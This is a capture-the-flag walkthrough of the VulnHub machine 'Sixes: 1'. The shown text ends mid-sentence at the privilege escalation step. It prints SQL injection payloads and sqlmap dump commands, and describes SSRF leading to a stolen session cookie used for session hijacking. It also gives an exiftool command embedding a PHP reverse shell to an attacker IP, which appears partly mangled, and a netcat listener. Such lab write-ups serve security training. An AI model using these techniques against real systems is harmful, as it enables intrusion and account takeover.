content:
9 min read
Just now

--

In this walkthrough, I demonstrate how I solved the Sixes: 1 machine from VulnHub. The objective is to identify vulnerabilities, gain initial access, and escalate privileges to obtain root access. This walkthrough is intended for educational purposes and should only be used in authorized lab environments.
Lab Information

• Machine: Sixes: 1

• Platform: VulnHub

• Operating System: Linux.

• Goal: Obtain user and root access.
Step 1 — Setting Up the Lab
Imported Sixes.ova file into VirtualBox configured the network (NAT, Host-only, or Bridged).
Step 2 — Discover the Target
We can use arp-scan
Example:
arp-scan -lAfter identifying the target IP.
Step 3 — Port Scanning
Run an Nmap scan.
nmap -sV 192.169.xx.xxOpen port

• Port 21 — FTP

• Port 22 — SSH

• Port 80 — HTTP
Nmap Scan Analysis
The Nmap service detection scan identified three open ports on the target system:

• Port 21 (FTP): The service is running vsftpd 3.0.3, indicating that an FTP server is available. FTP services are commonly checked for anonymous login access, writable directories, or exposed files that could aid further enumeration or provide an initial foothold.

• Port 22 (SSH): The host is running OpenSSH 7.6p1, which provides secure remote shell access. Although SSH is generally not directly exploitable, it may become useful if valid credentials are obtained during later stages of the assessment.

• Port 80 (HTTP): The target is hosting a web application on Apache HTTP Server 2.4.29. Since web applications often present the largest attack surface, this service became the primary focus for further enumeration.
FTP Enumeration
After identifying the FTP service during the Nmap scan, I attempted to log in using the anonymous account. The login was successful, confirming that anonymous access was enabled on the FTP server.
The note.txt file contained the first challenge flag:
shellmates{5c6b5e84ab3fa94257bdce66b9c1c200}Web Enumeration
After completing the FTP enumeration and retrieving the first flag, I shifted my focus to the HTTP service running on port 80. Since web applications are a common attack surface in penetration testing and CTF challenges, the next step was to enumerate the website for hidden pages, directories, and potential vulnerabilities.
I accessed the web application by navigating to:
http://192.168.xx.xxThe homepage displayed a blog titled “SiXeS’s Blog!”, which appeared to be a simple blogging platform. The navigation bar contained the following pages:

• Home

• About

• Contact

• Restricted Area
While browsing the application, I observed that individual blog posts were loaded using a GET parameter. For example:
http://192.168.xx.xx/?page=post.php&id=1The presence of user-controlled parameters such as page and id suggested potential input validation weaknesses. Parameters like these are often tested for vulnerabilities including:

• SQL Injection (SQLi)

• Local File Inclusion (LFI)

• Remote File Inclusion (RFI), where applicable

• Other input validation flaws
Since the id parameter appeared to interact directly with the backend database, it became the primary target for testing. To determine whether the application was vulnerable to SQL Injection, I modified the request by injecting a UNION-based SQL query and analyzed the application's response.
Payload tested:
?id=-1 UNION SELECT 1,2,3The application responded successfully, confirming that the id parameter was vulnerable to UNION-based SQL Injection. This indicated that arbitrary SQL queries could be executed, allowing information to be extracted from the backend database.
Press enter or click to view image in full size

To verify the vulnerability further, I retrieved the MySQL server version using the following payload:
?id=-1 UNION SELECT VERSION(),2,3The application returned the following database version:
5.7.27-0ubuntu0.18.04.1Successfully retrieving the database version confirmed that the SQL injection was fully exploitable. With this confirmation, the next objective was to enumerate the database by identifying available databases, tables, and columns in order to extract useful information such as usernames, passwords, or other sensitive data.
Press enter or click to view image in full size

Step 4 — Database Enumeration
I used SQLMap to automate the database enumeration process and gather additional information about the backend database.
The following command was used:
sqlmap -u "http://192.168.xx.xx/?page=post.php&id=1" --dbsSQLMap identified the backend database as MySQL and detected the available database named sixes. I then enumerated the tables within this database using:
sqlmap -u "http://192.168.xx.xx/?page=post.php&id=1" -D sixes --tablesThe scan revealed the following tables:

• articles

• users

• s3cr3tT4bl3_31337
The presence of the s3cr3tT4bl3_31337 table immediately stood out due to its unusual name, suggesting it might contain sensitive information or credentials. This table became the primary target for further enumeration.
sqlmap enumerationEnumerating the users Table
After identifying the available tables, I inspected the contents of the users table to search for valid user credentials.The output revealed the following user account:
Press enter or click to view image in full size

users tablePress enter or click to view image in full size

Username: webmaster
Password: c78180d394684c07d6d87b291d8fe533.
Enumerating the s3cr3tT4bl3_31337 Table
After extracting the user credentials, I continued enumerating the remaining tables in the database. Due to its unusual name, the s3cr3tT4bl3_31337 table appeared particularly interesting and was selected for further inspection.
The table contained the second flag:
shellmates{69f78fa6e9f49d180d145553ceecf87d}This confirmed that the SQL injection vulnerability allowed unrestricted access to sensitive database tables. Successfully enumerating and dumping the contents of the database not only revealed user credentials but also exposed another challenge flag.
Press enter or click to view image in full size

The flagStep 5 — Exploiting the Contact Page
After completing the database enumeration, I continued exploring the application’s functionality and examined the Contact page for additional attack vectors.
The Contact page contained a form that accepted a user-supplied URL. Since applications that fetch remote resources can sometimes be vulnerable to Server-Side Request Forgery (SSRF), I decided to test this functionality using Burp Collaborator.
I generated a unique Burp Collaborator URL and submitted it through the Contact form. Shortly afterward, Burp Collaborator recorded an incoming request from the target server, confirming that the application was making outbound HTTP requests on behalf of the user.
More importantly, the request included the application’s PHPSESSID session cookie, disclosing a valid session identifier.
This demonstrated that the Contact page was vulnerable to Server-Side Request Forgery (SSRF), allowing the server to make external requests and unintentionally leak sensitive information.
Press enter or click to view image in full size

Uploading a unique Burp Collaborator URLBurp Collaborator receiving the request from the target server, including the leaked PHPSESSID session cookie.
Press enter or click to view image in full size

Burp Collaborator capturing PHPSESSIDThe leaked session cookie was:
PHPSESSID=591fcci3g87uvm13d58gcl1o0cThe disclosure of a valid PHPSESSID indicates that the application exposed sensitive session information during the SSRF request. If this session belonged to an authenticated user and appropriate protections were not in place, an attacker could potentially reuse the session identifier to impersonate the user through session hijacking.
Step 6 — Session Hijacking
After obtaining the leaked PHPSESSID through the Contact page, I attempted to determine whether the session belonged to an authenticated user.
To do this, I replaced my browser’s existing PHPSESSID cookie with the leaked session identifier:
PHPSESSID=591fcci3g87uvm13d58gcl1o0cOnce the session cookie was updated, I navigated to the Restricted Area (/admin.php). Instead of being redirected to a login page or prompted for authentication, the application accepted the supplied session and granted access to the administrative interface.
Press enter or click to view image in full size

changing PHPSESSID cookie with the leaked sessionStep 7 — Accessing the Admin Panel
After replacing my browser’s PHPSESSID cookie with the leaked session identifier, I revisited the Restricted Area (/admin.php).
This time, instead of being presented with the login page, I was successfully authenticated and gained access to the Image Uploader v1.0 administrative panel without providing any credentials.
The page also displayed the third challenge flag:
shellmates{918941c3c797f3fe3a6bc6003fc807cb}Successful session hijacking providing access to the Image Uploader v1.0 admin panel and revealing the third flag.
Press enter or click to view image in full size

Admin panel accessThis demonstrated a successful session hijacking attack, allowing unauthorized access to restricted functionality without needing to know the administrator’s username or password. The Image Uploader functionality became the next target for further testing, as file upload features are commonly susceptible to vulnerabilities such as unrestricted file upload, which can potentially lead to remote code execution.
Step 8 — Exploiting the File Upload Functionality
After gaining access to the administrative panel through session hijacking, I examined the Image Uploader v1.0 feature.
Testing revealed that the application did not properly validate uploaded files. By embedding PHP code within an image’s metadata, I was able to bypass the upload restrictions and successfully upload the file to the server.The application accepted the upload without performing adequate validation, indicating that the file upload functionality was vulnerable.The Image Uploader successfully accepts the crafted image file.
To prepare the upload, I used ExifTool to embed PHP code into the metadata of a legitimate image file. ExifTool is a utility that allows metadata within image files to be viewed and modified.
exiftool -Comment='& /dev/tcp/192.168.xx.xx/4444 0>&1\""); ?>' elephant.jpg
mv elephant.jpg elephant.phpStep 9 — Obtaining Initial Shell Access
After successfully uploading the crafted PHP file through the vulnerable upload functionality, the next step was to execute it.
The uploaded file was accessible from the /img/ directory:
http://192.168.xx.xx/img/elephant.phpBefore accessing the uploaded file, I started a Netcat listener on my attacking machine to wait for the incoming connection.
nc -lvnp 4444Once the uploaded PHP file was accessed through the browser, the embedded PHP code was executed by the web server. This triggered a reverse shell connection back to my attacking machine, providing remote command-line access to the target system.
Press enter or click to view image in full size

We got the ShellStep 10 — Post-Exploitation Enumeration
After obtaining an interactive shell on the target system, I began enumerating the filesystem to identify user files, configuration files, and potential privilege escalation vectors.
Navigating to the /home/webmaster directory revealed the following files:
cd /home/webmaster
ls -laThe directory contained:

• low_user.txt

• notes.txt

• users.txt
I was able to read the contents of low_user.txt, which contained the fourth challenge flag:
shellmates{e02c5869b5dc6e57c0bc24dc8946fe94}However, attempts to access notes.txt and users.txt resulted in Permission denied errors, indicating that these files were protected by file system permissions and could not be accessed with the current privileges.
Step 11 — Privilege Escalation
During post-exploitation enumeration, I attempted to access the remaining files in the /home/webmaster directory. Although low_user.txt was readable, access to
